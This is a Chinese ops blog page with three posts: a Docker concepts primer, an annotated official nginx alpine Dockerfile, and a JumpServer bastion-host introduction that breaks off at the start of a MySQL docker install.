          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/Docker/" itemprop="url" rel="index"><span itemprop="name">Docker</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>docker 的主要目标：一次封装，到处运行</p>
<p>容器和虚拟机技术比较：</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1605680745496.png"></p>
<ul>
<li>容器内的应用直接运行在宿主机的内核之上，容器并没有自己的内核，也不需要虚拟硬件，相当轻量化</li>
<li>容器间是互相隔离，每个容器内都有一个属于自己的独立文件系统、进程空间、网络空间、用户空间等，所以在同一个宿主机上的多个容器之间彼此不会相互影响</li>
</ul>
<h2 id="docker-的组成"><a href="#docker-的组成" class="headerlink" title="docker 的组成"></a>docker 的组成</h2><p>docker 官网：<a target="_blank" rel="noopener" href="http://www.docker.com/">http://www.docker.com</a><br>帮助文档：<a target="_blank" rel="noopener" href="https://docs.docker.com/">https://docs.docker.com/</a><br>docker 镜像：<a target="_blank" rel="noopener" href="https://hub.docker.com/">https://hub.docker.com/</a><br>docker 中文网站：<a target="_blank" rel="noopener" href="http://www.docker.org.cn/">http://www.docker.org.cn/</a></p>
<p><strong>镜像和容器：</strong></p>
<p>镜像可以理解为是一个模板，创建实例使用的模板，本质就是一些程序文件的合集<br>容器是从镜像生成对外提供服务的一个或一组服务，本质就是将镜像中的程序启动后生成的进程</p>
<h2 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h2><p>命名空间，linux 底层概念，在内核层实现，容器使用 namespce 技术实现容器间相互隔离</p>
<ul>
<li>mnt namespace：隔离根，即 chroot 技术。提供磁盘挂载点和文件系统的隔离能力</li>
<li>ipc namespace：隔离进程间通信。提供进程间通信的隔离能力，包括信号量，消息队列和共享内存</li>
<li>uts namespace：隔离系统信息。提供内核、主机名和域名隔离能力</li>
<li>pid namespace：隔离进程号。提供进程隔离能力</li>
<li>net namespace：隔离网络。提供网络隔离能力，包括网络设备，网络栈，端口等</li>
<li>user namespce：隔离用户。提供用户隔离能力，包括用户和组</li>
</ul>
<h2 id="Cgroups"><a href="#Cgroups" class="headerlink" title="Cgroups"></a>Cgroups</h2><p>Cgroups：Control Groups</p>
<p>Cgroups 最主要的作用，就是限制一个进程组能够使用的资源上限，包括 CPU、内存、磁盘、网络带宽等等。此外，还能够对进程进行优先级设置，资源的计量以及资源的控制（比如 将进程挂起和恢复等操作）</p>
<p>利用 Cgroups，宿主机可以对容器进行资源分配限制，比如 CPU、内存等</p>
<h2 id="容器核心技术"><a href="#容器核心技术" class="headerlink" title="容器核心技术"></a>容器核心技术</h2><h3 id="容器规范"><a href="#容器规范" class="headerlink" title="容器规范"></a>容器规范</h3><p>容器除了 docker，还有 rkt、Pouch 等，所有容器都要遵守标准的容器规范，这个规范由一个叫 OCI 的组织定，目前 OCI 一共发布了两个规范，分别是 <strong>runtime spec</strong> 和 <strong>image fortmat spec</strong>，只要遵守这两个规范，就可以保证容器的可移植性和相互可操作性。</p>
<h3 id="容器-runtime"><a href="#容器-runtime" class="headerlink" title="容器 runtime"></a>容器 runtime</h3><p>runtime 是真正运行容器的地方，因此为了运行不同的容器，runtime 需要和操作系统内核紧密合作、相互支持，以便为容器提供相应的运行环境</p>
<p>runtime 类型：lxc、libcontainer、runc、rkt</p>
<p>docker 早期的 runtime 类型是 lxc，现在是 runc</p>
<h3 id="容器管理工具"><a href="#容器管理工具" class="headerlink" title="容器管理工具"></a>容器管理工具</h3><p>管理工具连接 runtime 与用户，对用户提供图形或命令方式操作，然后管理工具将用户操作传递给 runtime 执行</p>
<ul>
<li>lxc 的 管理工具是 lxc</li>
<li>rkt 的 管理工具是 rkt cli</li>
<li>runc 的管理工具是 docker engine，docker engine 包含 daemon 和 cli 两部分额，大家经常提到的 docker 就是 docker engine</li>
</ul>
<h3 id="容器定义工具"><a href="#容器定义工具" class="headerlink" title="容器定义工具"></a>容器定义工具</h3><p>容器定义工具允许用户定义容器的属性和内容，以方便容器能够被保存、共享和重建</p>
<p>docker image：是 docker 容器的模板，runtime 依据 docker image 创建容器</p>
<p>dockerfile：包含 N 个命令的文本文件，通过 dockerfile 创建出 docker image</p>
<h3 id="镜像仓库-Registry"><a href="#镜像仓库-Registry" class="headerlink" title="镜像仓库 Registry"></a>镜像仓库 Registry</h3><ul>
<li>docker hub：docker 官方的公共仓库，已经保存了大量的常用镜像，可以方便大家直接使用</li>
<li>阿里云、网易等第三方镜像的公共仓库</li>
<li>image registry：docker 官方提供的私有仓库部署工具，无 web 管理界面,目前使用较少</li>
<li>harbor：vmware 提供的自带 web 界面自带认证功能的镜像私有仓库，目前有很多公司使用</li>
</ul>
<h3 id="容器编排工具"><a href="#容器编排工具" class="headerlink" title="容器编排工具"></a>容器编排工具</h3><ul>
<li>docker compose：docker 官方实现单机的容器的编排工具</li>
<li>docker swarm：docker 官方开发的容器编排引擎</li>
<li>Mesos+Marathon：Mesos 是 Apache 下的开源分布式资源管理框架,它被称为是分布式系统的内核。Mesos 最初是由加州大学伯克利分校的 AMPLab 开发的,后在 Twitter 得到广泛使用。通用的集群组员调度平台,mesos(资源分配)与 marathon(容器编排平台)一起提供容器编排引擎功能</li>
<li>Kubernetes：google 主导开发的容器编排引擎，内部项目为 Borg，且其同时支持 docker 和 CoreOS，当前已成为容器编排工具事实上的标准</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/Docker/alpine-nginx/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/Docker/alpine-nginx/" class="post-title-link" itemprop="url">alpine-nginx</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-08 11:26:43" itemprop="dateCreated datePublished" datetime="2021-01-08T11:26:43+08:00">2021-01-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/Docker/" itemprop="url" rel="index"><span itemprop="name">Docker</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#</span>
<span class="token comment"># 注意：此DOCKERFILE是通过"update.sh"生成的</span>
<span class="token comment">#</span>
<span class="token comment"># 请不要直接编辑它。</span>
<span class="token comment">#</span>
FROM alpine:3.16		<span class="token comment"># 基础镜像,后续的指令都是运行于此基准镜像所提供的运行环境</span>

LABEL <span class="token assign-left variable">maintainer</span><span class="token operator">=</span><span class="token string">"NGINX Docker Maintainers &lt;docker-maint@nginx.com>"</span>	<span class="token comment"># 指定镜像元数据</span>

ENV NGINX_VERSION <span class="token number">1.22</span>.1	<span class="token comment"># 定义环境变量</span>
ENV NJS_VERSION   <span class="token number">0.7</span>.7
ENV PKG_RELEASE   <span class="token number">1</span>

RUN <span class="token builtin class-name">set</span> <span class="token parameter variable">-x</span> <span class="token punctuation">\</span>
<span class="token comment"># create nginx user/group first, to be consistent throughout docker variants</span>
    <span class="token operator">&amp;&amp;</span> addgroup <span class="token parameter variable">-g</span> <span class="token number">101</span> <span class="token parameter variable">-S</span> nginx <span class="token punctuation">\</span>	<span class="token comment"># -g指定gid, -S创建系统组（这里是busybox,如果是shell,-r创建系统组）,组名为 nginx</span>
    <span class="token comment"># -S创建系统用户,-D不分配密码,-H不创建用户家目录,-u指定用户id,-h指定用户家目录,-s指定用户的默认shell, 可从/etc/shells中选择, 如果是给服务用, 指定/sbin/nologin,-G指定用户所属的附加群组,-g指定用户所属的群组, 用户名nginx</span>
    <span class="token operator">&amp;&amp;</span> adduser <span class="token parameter variable">-S</span> <span class="token parameter variable">-D</span> <span class="token parameter variable">-H</span> <span class="token parameter variable">-u</span> <span class="token number">101</span> <span class="token parameter variable">-h</span> /var/cache/nginx <span class="token parameter variable">-s</span> /sbin/nologin <span class="token parameter variable">-G</span> nginx <span class="token parameter variable">-g</span> nginx nginx <span class="token punctuation">\</span>
    <span class="token operator">&amp;&amp;</span> <span class="token assign-left variable">apkArch</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /etc/apk/arch<span class="token variable">)</span></span>"</span> <span class="token punctuation">\</span>		<span class="token comment"># x86_64</span>
    <span class="token operator">&amp;&amp;</span> <span class="token assign-left variable">nginxPackages</span><span class="token operator">=</span><span class="token string">" \
        nginx=<span class="token variable">$&#123;NGINX_VERSION&#125;</span>-r<span class="token variable">$&#123;PKG_RELEASE&#125;</span> \							# nginx=1.22.1-r1
        nginx-module-xslt=<span class="token variable">$&#123;NGINX_VERSION&#125;</span>-r<span class="token variable">$&#123;PKG_RELEASE&#125;</span> \				# nginx-module-xslt=1.22.1-r1
        nginx-module-geoip=<span class="token variable">$&#123;NGINX_VERSION&#125;</span>-r<span class="token variable">$&#123;PKG_RELEASE&#125;</span> \				# nginx-module-geoip=1.22.1-r1
        nginx-module-image-filter=<span class="token variable">$&#123;NGINX_VERSION&#125;</span>-r<span class="token variable">$&#123;PKG_RELEASE&#125;</span> \		# nginx-module-image-filter=1.22.1-r1
        nginx-module-njs=<span class="token variable">$&#123;NGINX_VERSION&#125;</span>.<span class="token variable">$&#123;NJS_VERSION&#125;</span>-r<span class="token variable">$&#123;PKG_RELEASE&#125;</span> \	# nginx-module-njs=1.22.1.0.7.7-r1
    "</span> <span class="token punctuation">\</span>
    <span class="token operator">&amp;&amp;</span> <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g'</span> /etc/apk/repositories <span class="token punctuation">\</span>
<span class="token comment"># install prerequisites for public key and pkg-oss checks</span>
    <span class="token operator">&amp;&amp;</span> apk <span class="token function">add</span> --no-cache <span class="token parameter variable">--virtual</span> .checksum-deps <span class="token punctuation">\</span>
        openssl <span class="token punctuation">\</span>
    <span class="token operator">&amp;&amp;</span> <span class="token keyword">case</span> <span class="token string">"<span class="token variable">$apkArch</span>"</span> <span class="token keyword">in</span> <span class="token punctuation">\</span>
        x86_64<span class="token operator">|</span>aarch64<span class="token punctuation">)</span> <span class="token punctuation">\</span>
<span class="token comment"># arches officially built by upstream</span>
            <span class="token builtin class-name">set</span> <span class="token parameter variable">-x</span> <span class="token punctuation">\</span>
            <span class="token operator">&amp;&amp;</span> <span class="token assign-left variable">KEY_SHA512</span><span class="token operator">=</span><span class="token string">"e7fa8303923d9b95db37a77ad46c68fd4755ff935d0a534d26eba83de193c76166c68bfe7f65471bf8881004ef4aa6df3e34689c305662750c0172fca5d8552a *stdin"</span> <span class="token punctuation">\</span>
            <span class="token operator">&amp;&amp;</span> <span class="token function">wget</span> <span class="token parameter variable">-O</span> /tmp/nginx_signing.rsa.pub https://nginx.org/keys/nginx_signing.rsa.pub <span class="token punctuation">\</span>
            <span class="token operator">&amp;&amp;</span> <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span>openssl rsa <span class="token parameter variable">-pubin</span> <span class="token parameter variable">-in</span> /tmp/nginx_signing.rsa.pub <span class="token parameter variable">-text</span> <span class="token parameter variable">-noout</span> <span class="token operator">|</span> openssl sha512 <span class="token parameter variable">-r</span><span class="token variable">)</span></span>"</span> <span class="token operator">=</span> <span class="token string">"<span class="token variable">$KEY_SHA512</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token punctuation">\</span>
                <span class="token builtin class-name">echo</span> <span class="token string">"key verification succeeded!"</span><span class="token punctuation">;</span> <span class="token punctuation">\</span>
                <span class="token function">mv</span> /tmp/nginx_signing.rsa.pub /etc/apk/keys/<span class="token punctuation">;</span> <span class="token punctuation">\</span>
            <span class="token keyword">else</span> <span class="token punctuation">\</span>
                <span class="token builtin class-name">echo</span> <span class="token string">"key verification failed!"</span><span class="token punctuation">;</span> <span class="token punctuation">\</span>
                <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">\</span>
            <span class="token keyword">fi</span> <span class="token punctuation">\</span>
            <span class="token comment"># -X 指定apk仓库：https://nginx.org/packages/alpine/v3.16/main</span>
            <span class="token operator">&amp;&amp;</span> apk <span class="token function">add</span> <span class="token parameter variable">-X</span> <span class="token string">"https://nginx.org/packages/alpine/v<span class="token variable"><span class="token variable">$(</span><span class="token function">egrep</span> <span class="token parameter variable">-o</span> <span class="token string">'^[0-9]+\.[0-9]+'</span> /etc/alpine-release<span class="token variable">)</span></span>/main"</span> --no-cache <span class="token variable">$nginxPackages</span> <span class="token punctuation">\</span>
            <span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token punctuation">\</span>
        *<span class="token punctuation">)</span> <span class="token punctuation">\</span>
<span class="token comment"># we're on an architecture upstream doesn't officially build for</span>
<span class="token comment"># let's build binaries from the published packaging sources</span>
            <span class="token builtin class-name">set</span> <span class="token parameter variable">-x</span> <span class="token punctuation">\</span>
            <span class="token operator">&amp;&amp;</span> <span class="token assign-left variable">tempDir</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span>mktemp <span class="token parameter variable">-d</span><span class="token variable">)</span></span>"</span> <span class="token punctuation">\</span>
            <span class="token operator">&amp;&amp;</span> <span class="token function">chown</span> nobody:nobody <span class="token variable">$tempDir</span> <span class="token punctuation">\</span>
            <span class="token operator">&amp;&amp;</span> apk <span class="token function">add</span> --no-cache <span class="token parameter variable">--virtual</span> .build-deps <span class="token punctuation">\</span>
                gcc <span class="token punctuation">\</span>
                libc-dev <span class="token punctuation">\</span>
                <span class="token function">make</span> <span class="token punctuation">\</span>
                openssl-dev <span class="token punctuation">\</span>
                pcre2-dev <span class="token punctuation">\</span>
                zlib-dev <span class="token punctuation">\</span>
                linux-headers <span class="token punctuation">\</span>
                libxslt-dev <span class="token punctuation">\</span>
                gd-dev <span class="token punctuation">\</span>
                geoip-dev <span class="token punctuation">\</span>
                perl-dev <span class="token punctuation">\</span>
                libedit-dev <span class="token punctuation">\</span>
                <span class="token function">bash</span> <span class="token punctuation">\</span>
                alpine-sdk <span class="token punctuation">\</span>
                findutils <span class="token punctuation">\</span>
            <span class="token operator">&amp;&amp;</span> <span class="token function">su</span> nobody <span class="token parameter variable">-s</span> /bin/sh <span class="token parameter variable">-c</span> <span class="token string">" \
                export HOME=<span class="token variable">$&#123;tempDir&#125;</span> \
                &amp;&amp; cd <span class="token variable">$&#123;tempDir&#125;</span> \
                # https://hg.nginx.org/pkg-oss/archive/1.22.1-1.tar.gz 包含nginx.conf、nginx.logrotate等各种文件
                &amp;&amp; curl -f -O https://hg.nginx.org/pkg-oss/archive/<span class="token variable">$&#123;NGINX_VERSION&#125;</span>-<span class="token variable">$&#123;PKG_RELEASE&#125;</span>.tar.gz \
                &amp;&amp; PKGOSSCHECKSUM=<span class="token entity" title="\&quot;">\"</span>7266f418dcc9d89a2990f504d99ec58d10febbaf078c03630d42843955cee7e50b0f90fb317360384a32473839dc42d8b329b737015ec8dd0d028f90d4d5ed25 *<span class="token variable">$&#123;NGINX_VERSION&#125;</span>-<span class="token variable">$&#123;PKG_RELEASE&#125;</span>.tar.gz<span class="token entity" title="\&quot;">\"</span> \
                &amp;&amp; if [ <span class="token entity" title="\&quot;">\"</span>\<span class="token variable"><span class="token variable">$(</span>openssl sha512 <span class="token parameter variable">-r</span> $<span class="token punctuation">&#123;</span>NGINX_VERSION<span class="token punctuation">&#125;</span>-$<span class="token punctuation">&#123;</span>PKG_RELEASE<span class="token punctuation">&#125;</span>.tar.gz<span class="token variable">)</span></span><span class="token entity" title="\&quot;">\"</span> = <span class="token entity" title="\&quot;">\"</span>\<span class="token variable">$PKGOSSCHECKSUM</span><span class="token entity" title="\&quot;">\"</span> ]; then \
                    echo <span class="token entity" title="\&quot;">\"</span>pkg-oss tarball checksum verification succeeded!<span class="token entity" title="\&quot;">\"</span>; \
                else \
                    echo <span class="token entity" title="\&quot;">\"</span>pkg-oss tarball checksum verification failed!<span class="token entity" title="\&quot;">\"</span>; \
                    exit 1; \
                fi \
                &amp;&amp; tar xzvf <span class="token variable">$&#123;NGINX_VERSION&#125;</span>-<span class="token variable">$&#123;PKG_RELEASE&#125;</span>.tar.gz \
                &amp;&amp; cd pkg-oss-<span class="token variable">$&#123;NGINX_VERSION&#125;</span>-<span class="token variable">$&#123;PKG_RELEASE&#125;</span> \
                &amp;&amp; cd alpine \
                &amp;&amp; make all \
                &amp;&amp; apk index -o <span class="token variable">$&#123;tempDir&#125;</span>/packages/alpine/<span class="token variable">$&#123;apkArch&#125;</span>/APKINDEX.tar.gz <span class="token variable">$&#123;tempDir&#125;</span>/packages/alpine/<span class="token variable">$&#123;apkArch&#125;</span>/*.apk \
                &amp;&amp; abuild-sign -k <span class="token variable">$&#123;tempDir&#125;</span>/.abuild/abuild-key.rsa <span class="token variable">$&#123;tempDir&#125;</span>/packages/alpine/<span class="token variable">$&#123;apkArch&#125;</span>/APKINDEX.tar.gz \
                "</span> <span class="token punctuation">\</span>
            <span class="token operator">&amp;&amp;</span> <span class="token function">cp</span> <span class="token variable">$&#123;tempDir&#125;</span>/.abuild/abuild-key.rsa.pub /etc/apk/keys/ <span class="token punctuation">\</span>
            <span class="token operator">&amp;&amp;</span> apk del .build-deps <span class="token punctuation">\</span>
            <span class="token operator">&amp;&amp;</span> apk <span class="token function">add</span> <span class="token parameter variable">-X</span> <span class="token variable">$&#123;tempDir&#125;</span>/packages/alpine/ --no-cache <span class="token variable">$nginxPackages</span> <span class="token punctuation">\</span>
            <span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token punctuation">\</span>
    <span class="token keyword">esac</span> <span class="token punctuation">\</span>
<span class="token comment"># remove checksum deps</span>
    <span class="token operator">&amp;&amp;</span> apk del .checksum-deps <span class="token punctuation">\</span>
<span class="token comment"># if we have leftovers from building, let's purge them (including extra, unnecessary build deps)</span>
    <span class="token operator">&amp;&amp;</span> <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$tempDir</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token string">"<span class="token variable">$tempDir</span>"</span><span class="token punctuation">;</span> <span class="token keyword">fi</span> <span class="token punctuation">\</span>
    <span class="token operator">&amp;&amp;</span> <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"/etc/apk/keys/abuild-key.rsa.pub"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token function">rm</span> <span class="token parameter variable">-f</span> /etc/apk/keys/abuild-key.rsa.pub<span class="token punctuation">;</span> <span class="token keyword">fi</span> <span class="token punctuation">\</span>
    <span class="token operator">&amp;&amp;</span> <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"/etc/apk/keys/nginx_signing.rsa.pub"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token function">rm</span> <span class="token parameter variable">-f</span> /etc/apk/keys/nginx_signing.rsa.pub<span class="token punctuation">;</span> <span class="token keyword">fi</span> <span class="token punctuation">\</span>
<span class="token comment"># Bring in gettext so we can get `envsubst`, then throw</span>
<span class="token comment"># the rest away. To do this, we need to install `gettext`</span>
<span class="token comment"># then move `envsubst` out of the way so `gettext` can</span>
<span class="token comment"># be deleted completely, then move `envsubst` back.</span>
    <span class="token operator">&amp;&amp;</span> apk <span class="token function">add</span> --no-cache <span class="token parameter variable">--virtual</span> .gettext gettext <span class="token punctuation">\</span>
    <span class="token operator">&amp;&amp;</span> <span class="token function">mv</span> /usr/bin/envsubst /tmp/ <span class="token punctuation">\</span>
    <span class="token punctuation">\</span>
    <span class="token operator">&amp;&amp;</span> <span class="token assign-left variable">runDeps</span><span class="token operator">=</span><span class="token string">"$( \
        scanelf --needed --nobanner /tmp/envsubst \
            | awk '&#123; gsub(/,/, "<span class="token entity" title="\n">\n</span>so:", <span class="token variable">$2</span>); print "</span>so:<span class="token string">" <span class="token variable">$2</span> &#125;' \
            | sort -u \
            | xargs -r apk info --installed \
            | sort -u \
    )"</span> <span class="token punctuation">\</span>
    <span class="token operator">&amp;&amp;</span> apk <span class="token function">add</span> --no-cache <span class="token variable">$runDeps</span> <span class="token punctuation">\</span>
    <span class="token operator">&amp;&amp;</span> apk del .gettext <span class="token punctuation">\</span>
    <span class="token operator">&amp;&amp;</span> <span class="token function">mv</span> /tmp/envsubst /usr/local/bin/ <span class="token punctuation">\</span>
<span class="token comment"># Bring in tzdata so users could set the timezones through the environment</span>
<span class="token comment"># variables</span>
    <span class="token operator">&amp;&amp;</span> apk <span class="token function">add</span> --no-cache tzdata <span class="token punctuation">\</span>
<span class="token comment"># Bring in curl and ca-certificates to make registering on DNS SD easier</span>
    <span class="token operator">&amp;&amp;</span> apk <span class="token function">add</span> --no-cache <span class="token function">curl</span> ca-certificates <span class="token punctuation">\</span>
<span class="token comment"># forward request and error logs to docker log collector</span>
    <span class="token operator">&amp;&amp;</span> <span class="token function">ln</span> <span class="token parameter variable">-sf</span> /dev/stdout /var/log/nginx/access.log <span class="token punctuation">\</span>
    <span class="token operator">&amp;&amp;</span> <span class="token function">ln</span> <span class="token parameter variable">-sf</span> /dev/stderr /var/log/nginx/error.log <span class="token punctuation">\</span>
<span class="token comment"># create a docker-entrypoint.d directory</span>
    <span class="token operator">&amp;&amp;</span> <span class="token function">mkdir</span> /docker-entrypoint.d

COPY docker-entrypoint.sh /
COPY <span class="token number">10</span>-listen-on-ipv6-by-default.sh /docker-entrypoint.d
COPY <span class="token number">20</span>-envsubst-on-templates.sh /docker-entrypoint.d
COPY <span class="token number">30</span>-tune-worker-processes.sh /docker-entrypoint.d
ENTRYPOINT <span class="token punctuation">[</span><span class="token string">"/docker-entrypoint.sh"</span><span class="token punctuation">]</span>

EXPOSE <span class="token number">80</span>

STOPSIGNAL SIGQUIT

CMD <span class="token punctuation">[</span><span class="token string">"nginx"</span>, <span class="token string">"-g"</span>, <span class="token string">"daemon off;"</span><span class="token punctuation">]</span></code></pre>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/JumpServer/JumpServer/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/JumpServer/JumpServer/" class="post-title-link" itemprop="url">JumpServer</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-07 18:38:39" itemprop="dateCreated datePublished" datetime="2021-01-07T18:38:39+08:00">2021-01-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/JumpServer/" itemprop="url" rel="index"><span itemprop="name">JumpServer</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="JumpServer-简介"><a href="#JumpServer-简介" class="headerlink" title="JumpServer 简介"></a>JumpServer 简介</h2><p>跳板机 和 堡垒机</p>
<p><strong>跳板机</strong>：跳板机就是一台服务器，维护人员在维护过程中，首先要统一登录到这台服务器上，然后从这台服务器再登录到目标设备进行维护。但跳板机没有实现对运维人员操作行为的控制和审计，此外，跳板机存在严重的安全风险，一旦跳板机系统被攻入，则将后端资源风险完全暴露无遗。<strong>安装 OpenVPN 的机器就是跳板机</strong></p>
<p><strong>堡垒机</strong>：跳板机的升级版，提供了认证、授权、审计、自动化运维等功能</p>
<p>可以同时配置 openvpn 和 jumpserver，运维自己通过 openvpn 连接，比较方便，开发测试等其他人员都通过 jumpserver 连接，便于管理</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1610029532825.png"></p>
<p><img data-src="//img.to2b.cn/blog/ljk/1610016414632.png"></p>
<p><strong>JumpServer</strong> 是全球首款完全开源的堡垒机，使用 Python &#x2F; Django、Go 进行开发，符合 4A 标准</p>
<p>官方地址： <a target="_blank" rel="noopener" href="http://www.jumpserver.org/">http://www.jumpserver.org/</a><br>github 项目: <a target="_blank" rel="noopener" href="https://github.com/jumpserver">https://github.com/jumpserver</a></p>
<p>特色优势：</p>
<ul>
<li>开源</li>
<li>分布式</li>
<li>无插件：仅需浏览器，极致的 Web Terminal 使用体验；</li>
<li>多云系统：一套系统，同时管理不同云上面的资产；</li>
<li>云端存储</li>
<li>多租户：一套系统，多个子公司和部门同时使用。</li>
</ul>
<p><img data-src="//img.to2b.cn/blog/ljk/1610016642207.png"></p>
<h3 id="功能列表"><a href="#功能列表" class="headerlink" title="功能列表"></a>功能列表</h3><p><a target="_blank" rel="noopener" href="https://docs.jumpserver.org/zh/master/#_3%EF%BC%8C%E5%85%B6%E4%B8%AD%E9%83%A8%E5%88%86%E5%8A%9F%E8%83%BD%E5%95%86%E4%B8%9A%E7%89%88%E6%89%8D%E5%85%B7%E6%9C%89">https://docs.jumpserver.org/zh/master/#_3，其中部分功能商业版才具有</a></p>
<ul>
<li><p><strong>身份鉴别</strong></p>
<p>Authentication，防止身份冒用和复用</p>
</li>
<li><p><strong>账号管理</strong></p>
<p>Account，人员和资产管理</p>
</li>
<li><p><strong>授权控制</strong></p>
<p>Authorization，防止内部误操作和权限滥用</p>
</li>
<li><p><strong>安全审计</strong></p>
<p>Audit，追溯的保障和事故分析的依据</p>
</li>
<li><p><strong>数据库审计</strong></p>
<p>Database</p>
</li>
</ul>
<h3 id="JumpServer-组成"><a href="#JumpServer-组成" class="headerlink" title="JumpServer 组成"></a>JumpServer 组成</h3><p><img data-src="//img.to2b.cn/blog/ljk/1610018157112.png"></p>
<h2 id="安装-JumpServer"><a href="#安装-JumpServer" class="headerlink" title="安装 JumpServer"></a>安装 JumpServer</h2><p>文档只介绍了极速部署和负载均衡两种安装方式，其实以前的文档是很详细的，现在大大简化了，可能是为了让你买商业版吧</p>
<p>jumpserver 依赖 MySQL（5.7 及以上）和 Redis（5.0 及以上），这里为了方便，均使用 docker 安装</p>
<h3 id="安装-MySQL"><a href="#安装-MySQL" class="headerlink" title="安装 MySQL"></a>安装 MySQL</h3><pre class="language-bash" data-language="bash"><code class="language-bash">root@u1:~<span class="token comment"># docker pull mysql:5.7.32		# pull mysql镜像，指定版本号5.7.32</span>
<span class="token comment"># 在宿主机准备相关目录</span>
